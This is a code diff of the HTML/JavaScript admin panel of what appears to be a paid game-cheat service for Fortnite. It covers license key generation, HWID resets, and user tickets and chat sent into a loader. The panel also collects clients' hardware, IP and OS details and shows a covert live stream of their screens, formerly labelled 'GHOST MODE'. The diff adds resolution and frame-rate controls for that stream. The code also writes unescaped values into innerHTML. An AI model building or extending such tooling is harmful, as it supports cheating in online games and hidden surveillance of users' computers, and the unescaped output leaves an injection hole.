@@ -78,7 +78,7 @@
             100% { border-color: var(--accent-color); box-shadow: 0 0 15px var(--accent-glow); }
         }
 
-        /* LOGIN OVERLAY (Fix username Assmar00) */
+        /* LOGIN OVERLAY */
         #login-overlay {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -449,7 +449,7 @@
 </head>
 <body>
 
-    <!-- LOGIN SCREEN (Fixed Username: Assmar00) -->
+    <!-- LOGIN SCREEN -->
     <div id="login-overlay">
         <div class="login-card">
             <h2>ASSMAR00</h2>
@@ -471,7 +471,7 @@
 
             <div class="modal-tabs">
                 <button class="modal-tab-btn active" onclick="switchModalTab('info', this)" id="mtab-info">💻 System Info (msinfo32)</button>
-                <button class="modal-tab-btn" onclick="switchModalTab('stream', this)" id="mtab-stream">🔴 Live Screen View (15 FPS)</button>
+                <button class="modal-tab-btn" onclick="switchModalTab('stream', this)" id="mtab-stream">🔴 Live Screen View</button>
             </div>
 
             <!-- TAB 1: SYSTEM INFO -->
@@ -490,11 +490,33 @@
                 </div>
             </div>
 
-            <!-- TAB 2: LIVE SCREEN STREAM VIEWER -->
+            <!-- TAB 2: LIVE SCREEN STREAM VIEWER & CONTROLS -->
             <div id="modal-tab-stream" class="modal-tab-pane">
                 <div class="screen-stream-box">
-                    <div class="stream-overlay-info" id="stream-status-text">STREAM: LIVE // 720p @ 15 FPS // GHOST MODE ACTIVE</div>
+                    <div class="stream-overlay-info" id="stream-status-text">STREAM: LIVE // ACTIVE</div>
                     <img id="live-video-feed" src="" alt="Warte auf Client-Stream Verbindung..." style="width: 100%; height: 100%; object-fit: contain;">
+                </div>
+
+                <!-- STREAM STEUERUNG DIREKT UNTER DEM LIVE SCREEN -->
+                <div style="margin-top: 15px; background: var(--input-bg); border: 1px solid var(--input-border); padding: 12px; border-radius: 8px; display: flex; gap: 15px; align-items: center; justify-content: space-between;">
+                    <div style="display: flex; gap: 10px; align-items: center;">
+                        <label style="margin:0; font-size:10px;">Auflösung:</label>
+                        <select id="setting-res" onchange="updateStreamSettings()" style="width: 110px; margin-bottom: 0; padding: 4px;">
+                            <option value="720p">720p HD</option>
+                            <option value="1080p" selected>1080p FHD</option>
+                        </select>
+                    </div>
+
+                    <div style="display: flex; gap: 10px; align-items: center;">
+                        <label style="margin:0; font-size:10px;">Bildrate (FPS):</label>
+                        <select id="setting-fps" onchange="updateStreamSettings()" style="width: 90px; margin-bottom: 0; padding: 4px;">
+                            <option value="15">15 FPS</option>
+                            <option value="30" selected>30 FPS</option>
+                            <option value="60">60 FPS</option>
+                        </select>
+                    </div>
+
+                    <button class="btn-secondary" onclick="updateStreamSettings()" style="padding: 5px 12px; font-size: 11px;">Übernehmen</button>
                 </div>
             </div>
 
@@ -512,7 +534,6 @@
 
     <!-- MAIN PANEL CONTAINER -->
     <div id="app-container" style="display: none;">
-        <!-- SIDEBAR -->
         <sidebar>
             <div class="logo">ASSMAR00</div>
             
@@ -539,7 +560,6 @@
             <button class="nav-btn" onclick="switchTab('database', this)" id="nav-db">💾 SQL Backup & Konsole</button>
         </sidebar>
 
-        <!-- MAIN CONTENT AREA -->
         <main>
             <header>
                 <h1 id="page-title">System Telemetrie</h1>
@@ -621,22 +641,16 @@
                 </div>
             </div>
 
-            <!-- 5. LICENSES & CUSTOM EXPIRY & PAUSE -->
+            <!-- 5. LICENSES -->
             <div id="licenses" class="tab-content">
                 <div class="grid-2">
                     <div class="card">
                         <h2 id="hdr-batch-gen">Key Generator & Ablaufdatum</h2>
                         <label id="lbl-duration">Eigenes Ablaufdatum festlegen</label>
                         <input type="datetime-local" id="custom-expiry-date">
-                        
                         <label id="lbl-count">Anzahl Keys</label><input type="number" value="10">
                         <label>Prefix</label><input type="text" placeholder="ASSMAR">
                         <button id="btn-gen-keys" onclick="alert('Keys mit individuellem Ablaufdatum erstellt!')">Keys Erstellen</button>
-                        
-                        <div style="margin-top: 20px; border-top: 1px solid var(--card-border); padding-top: 15px;">
-                            <label style="color: #ffaa00;">Globale Lizenz-Steuerung</label>
-                            <button class="btn-warning" onclick="alert('ALLE Keys wurden pausiert!')" id="btn-pause-all" style="width: 100%; margin-top: 5px;">⏸️ ALLE KEYS PAUSIEREN</button>
-                        </div>
                     </div>
                     <div class="card" style="max-height:400px; overflow-y:auto;">
                         <h2 id="hdr-latest-keys">Aktive Keys & Einzel-Pause</h2>
@@ -648,18 +662,13 @@
                                     <th id="th-action-key">Aktion</th>
                                 </tr>
                             </thead>
-                            <tbody id="keys-table-body">
-                                <!-- Dynamically loaded keys -->
-                            </tbody>
+                            <tbody id="keys-table-body"></tbody>
                         </table>
                     </div>
                 </div>
             </div>
 
-            <!-- 6. PRICING -->
-            <div id="pricing" class="tab-content"><div class="card"><h2 id="hdr-pricing">Abonnements & Tiers</h2><p style="font-size:12px; color:var(--text-muted);" id="txt-pricing-desc">Abo-Modelle und Ränge verwalten.</p></div></div>
-
-            <!-- 7. USERS & DESKTOP NAMES & RENAME -->
+            <!-- 7. USERS & DESKTOP NAMES -->
             <div id="users" class="tab-content">
                 <div class="card">
                     <h2 id="hdr-user-table-desc">Aktive Live-Sessions (Desktop-Namen & Eigene Admin-Notizen)</h2>
@@ -673,9 +682,7 @@
                                 <th id="th-action">Aktion</th>
                             </tr>
                         </thead>
-                        <tbody id="users-table-body">
-                            <!-- Dynamically loaded active clients -->
-                        </tbody>
+                        <tbody id="users-table-body"></tbody>
                     </table>
                 </div>
             </div>
@@ -702,7 +709,7 @@
                                 </tr>
                             </thead>
                             <tbody>
-                                <tr class="user-row" onclick="loadTicket('T-881', 'User_Alpha', 'Bug Report', 'Fortnite', 'Color Prefire triggert manchmal leicht verzögert bei Waffenswap.', 'screenshot1.jpg', 'OFFEN')">
+                                <tr class="user-row">
                                     <td>User_Alpha</td>
                                     <td><span class="ticket-badge badge-bug">BUG</span></td>
                                     <td>Fortnite</td>
@@ -712,35 +719,19 @@
                             </tbody>
                         </table>
                     </div>
-
                     <div class="card" id="ticket-detail-box">
                         <h2 id="t-id-title">TICKET INSPECTOR // T-881</h2>
-                        
                         <div style="margin-bottom: 12px; font-size: 11px; font-family: monospace;">
-                            <div><strong>User:</strong> <span id="t-user">User_Alpha</span> (HWID: e3b0c442...)</div>
+                            <div><strong>User:</strong> <span id="t-user">User_Alpha</span></div>
                             <div><strong>Modell / Game:</strong> <span id="t-game" style="color:var(--accent-color);">Fortnite</span></div>
-                            <div><strong>Kategorie:</strong> <span id="t-cat">Bug Report</span></div>
                         </div>
-
-                        <label>Ticket Status ändern:</label>
-                        <select id="ticket-status-select" style="margin-bottom: 10px;">
-                            <option value="open" style="color:#ffaa00;">🟡 Offen (Neu)</option>
-                            <option value="progress" style="color:#00ffaa;">🔵 In Bearbeitung</option>
-                            <option value="resolved" style="color:#00ff66;">🟢 Gelöst (Resolved)</option>
-                            <option value="closed" style="color:#ff4455;">🔴 Geschlossen / Abgelehnt</option>
-                        </select>
-
                         <label>Nachricht vom User:</label>
-                        <textarea id="t-msg" rows="2" readonly style="background:#05040a;">Color Prefire triggert manchmal leicht verzögert bei Waffenswap.</textarea>
-
-                        <label id="lbl-live-chat">Live-Chat zum Loader des Users:</label>
+                        <textarea id="t-msg" rows="2" readonly style="background:#05040a;">Beispiel Report Text</textarea>
                         <div class="chat-box" id="chat-messages">
-                            <div class="chat-msg msg-user"><strong>User_Alpha:</strong> Hey, könnt ihr euch das anschauen?</div>
-                            <div class="chat-msg msg-admin"><strong>Admin Assmar00:</strong> Hi! Ich habe mir dein Ticket angeschaut. Welche Grafikkarte nutzt du?</div>
+                            <div class="chat-msg msg-user"><strong>User_Alpha:</strong> Hi!</div>
                         </div>
-
                         <div style="display: flex; gap: 8px;">
-                            <input type="text" id="chat-input" placeholder="Antwort direkt in den Loader senden..." style="margin-bottom: 0;">
+                            <input type="text" id="chat-input" placeholder="Nachricht senden..." style="margin-bottom: 0;">
                             <button onclick="sendChatMessage()">Senden</button>
                         </div>
                     </div>
@@ -748,7 +739,7 @@
             </div>
 
             <!-- 11. LOGS -->
-            <div id="logs" class="tab-content"><div class="card"><h2 id="hdr-logs">Audit Protokolle & Logs</h2><p style="font-family:monospace; font-size:11px; color:var(--accent-color);">[17:12:00] Admin Assmar00 logged in.<br>[17:11:45] Key verified: ASR-9812.<br>[17:10:02] Core status OK.</p></div></div>
+            <div id="logs" class="tab-content"><div class="card"><h2 id="hdr-logs">Audit Protokolle & Logs</h2><p style="font-family:monospace; font-size:11px; color:var(--accent-color);">[System] Backend connected.</p></div></div>
 
             <!-- 12. DATABASE -->
             <div id="database" class="tab-content"><div class="card"><h2 id="hdr-db">Database Backups & Wartung</h2><button class="btn-secondary" id="btn-sql-dl">SQL Backup Download</button></div></div>
@@ -829,7 +820,7 @@
                 hdrDb: "Database Backups & Wartung",
                 btnSqlDl: "SQL Backup Download",
                 mtabInfo: "💻 System Info (msinfo32)",
-                mtabStream: "🔴 Live Screen View (15 FPS)",
+                mtabStream: "🔴 Live Screen View",
                 lblMHwid: "Hardware ID (HWID Hash)",
                 lblMIp: "IP Adresse & Standort",
                 lblMCpu: "Prozessor (CPU)",
@@ -840,7 +831,7 @@
                 lblMGame: "Aktives Game-Profil",
                 lblMKey: "Lizenz-Schlüssel",
                 lblMExpiry: "Laufzeit Verbleibend",
-                streamStatusText: "STREAM: LIVE // 720p @ 15 FPS // GHOST MODE ACTIVE",
+                streamStatusText: "STREAM: LIVE // ACTIVE",
                 lblModalActions: "Einzel-User Aktionen",
                 mbtnHwid: "HWID Reset",
                 mbtnMsg: "Screen-Message Senden",
@@ -919,7 +910,7 @@
                 hdrDb: "Database Backups & Maintenance",
                 btnSqlDl: "Download SQL Backup",
                 mtabInfo: "💻 System Info (msinfo32)",
-                mtabStream: "🔴 Live Screen View (15 FPS)",
+                mtabStream: "🔴 Live Screen View",
                 lblMHwid: "Hardware ID (HWID Hash)",
                 lblMIp: "IP Address & Location",
                 lblMCpu: "Processor (CPU)",
@@ -930,7 +921,7 @@
                 lblMGame: "Active Game Profile",
                 lblMKey: "License Key",
                 lblMExpiry: "Remaining Time",
-                streamStatusText: "STREAM: LIVE // 720p @ 15 FPS // GHOST MODE ACTIVE",
+                streamStatusText: "STREAM: LIVE // ACTIVE",
                 lblModalActions: "Single User Actions",
                 mbtnHwid: "Reset HWID",
                 mbtnMsg: "Send Screen Message",
@@ -1009,7 +1000,7 @@
                 hdrDb: "Backup Database & Manutenzione",
                 btnSqlDl: "Scarica Backup SQL",
                 mtabInfo: "💻 Info di Sistema (msinfo32)",
-                mtabStream: "🔴 Vista Schermo Live (15 FPS)",
+                mtabStream: "🔴 Vista Schermo Live",
                 lblMHwid: "ID Hardware (Hash HWID)",
                 lblMIp: "Indirizzo IP & Posizione",
                 lblMCpu: "Processore (CPU)",
@@ -1020,7 +1011,7 @@
                 lblMGame: "Profilo Gioco Attivo",
                 lblMKey: "Chiave di Licenza",
                 lblMExpiry: "Tempo Rimanente",
-                streamStatusText: "STREAM: LIVE // 720p @ 15 FPS // GHOST MODE ATTIVO",
+                streamStatusText: "STREAM: LIVE // ACTIVE",
                 lblModalActions: "Azioni Singolo Utente",
                 mbtnHwid: "Ripristina HWID",
                 mbtnMsg: "Invia Messaggio a Schermo",
@@ -1135,7 +1126,7 @@
                 document.getElementById('login-overlay').style.display = 'none';
                 document.getElementById('app-container').style.display = 'flex';
                 loadLiveData();
-                setInterval(loadLiveData, 4000); // Live-Aktualisierung alle 4 Sekunden
+                setInterval(loadLiveData, 4000);
             } else {
                 err.innerText = "ACCESS DENIED: Falsches Passwort!";
                 document.getElementById('pass-input').value = "";
@@ -1162,10 +1153,8 @@
             btn.classList.add('active');
         }
 
-        // Lade echte Live-Daten vom FastAPI Backend
         async function loadLiveData() {
             try {
-                // Stats laden
                 const statsRes = await fetch('/api/stats');
                 const stats = await statsRes.json();
                 document.getElementById('stat-active-clients').innerText = stats.active_clients;
@@ -1173,7 +1162,6 @@
                 document.getElementById('stat-total-keys').innerText = stats.total_keys;
                 document.getElementById('stat-total-bans').innerText = stats.total_bans;
 
-                // Users laden
                 const usersRes = await fetch('/api/users');
                 const users = await usersRes.json();
                 const usersTbody = document.getElementById('users-table-body');
@@ -1196,7 +1184,6 @@
                     });
                 }
 
-                // Keys laden
                 const keysRes = await fetch('/api/keys');
                 const keys = await keysRes.json();
                 const keysTbody = document.getElementById('keys-table-body');
@@ -1206,12 +1193,32 @@
                     tr.innerHTML = `
                         <td>${k.key_code}</td>
                         <td style="color:${k.status === 'Aktiv' ? '#00ff66' : '#ffaa00'};">${k.status}</td>
-                        <td><button class="btn-secondary" style="padding: 2px 6px; font-size: 9px;" onclick="alert('Key ${k.key_code} Aktion')">Pausieren</button></td>
+                        <td><button class="btn-secondary" style="padding: 2px 6px; font-size: 9px;" onclick="alert('Key Aktion')">Pausieren</button></td>
                     `;
                     keysTbody.appendChild(tr);
                 });
             } catch(e) {
-                console.error("Fehler beim Laden der Live-Daten:", e);
+                console.error("Fehler beim Laden:", e);
+            }
+        }
+
+        async function updateStreamSettings() {
+            const res = document.getElementById('setting-res').value;
+            const fps = document.getElementById('setting-fps').value;
+            
+            try {
+                await fetch('/api/settings', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        stream_res: res,
+                        stream_fps: fps,
+                        stream_quality: res === '1080p' ? 75 : 65
+                    })
+                });
+                console.log("Stream-Einstellungen aktualisiert:", res, fps);
+            } catch(e) {
+                console.error("Fehler beim Speichern:", e);
             }
         }
 
@@ -1219,14 +1226,14 @@
             document.getElementById('m-user-title').innerText = "SYSTEM INSPECTOR & LIVE VIEW // " + u.desktop;
             document.getElementById('m-hwid').innerText = u.hwid || "N/A";
             document.getElementById('m-ip').innerText = u.ip || "127.0.0.1";
-            document.getElementById('m-cpu').innerText = u.cpu || "Unknown CPU";
-            document.getElementById('m-gpu').innerText = u.gpu || "NVIDIA / AMD GPU";
-            document.getElementById('m-motherboard').innerText = u.motherboard || "Standard Motherboard";
-            document.getElementById('m-ram').innerText = u.ram || "16GB DDR4";
-            document.getElementById('m-os').innerText = u.os_build || "Windows 10/11";
+            document.getElementById('m-cpu').innerText = u.cpu || "Unknown";
+            document.getElementById('m-gpu').innerText = u.gpu || "Unknown";
+            document.getElementById('m-motherboard').innerText = u.motherboard || "Unknown";
+            document.getElementById('m-ram').innerText = u.ram || "Unknown";
+            document.getElementById('m-os').innerText = u.os_build || "Unknown";
             document.getElementById('m-game').innerText = u.game || "Idle";
-            document.getElementById('m-key').innerText = u.license_key || "ASR-9812-PAUL";
-            document.getElementById('m-expiry').innerText = u.expiry || "Lifetime";
+            document.getElementById('m-key').innerText = u.license_key || "ASR-9812";
+            document.getElementById('m-expiry').innerText = u.expiry || "2026-12-31";
 
             document.getElementById('live-video-feed').src = "/video_feed?user=" + encodeURIComponent(u.desktop);
             document.getElementById('user-modal').style.display = 'flex';
@@ -1235,14 +1242,6 @@
         function closeUserModal() {
             document.getElementById('user-modal').style.display = 'none';
             document.getElementById('live-video-feed').src = "";
-        }
-
-        function loadTicket(id, user, cat, game, msg, media, status) {
-            document.getElementById('t-id-title').innerText = "TICKET INSPECTOR // " + id;
-            document.getElementById('t-user').innerText = user;
-            document.getElementById('t-cat').innerText = cat;
-            document.getElementById('t-game').innerText = game;
-            document.getElementById('t-msg').value = msg;
         }
 
         function sendChatMessage() {
@@ -1255,7 +1254,6 @@
             newMsg.className = "chat-msg msg-admin";
             newMsg.innerHTML = "<strong>Admin Assmar00:</strong> " + msgText;
             chatBox.appendChild(newMsg);
-
             input.value = "";
             chatBox.scrollTop = chatBox.scrollHeight;
         }
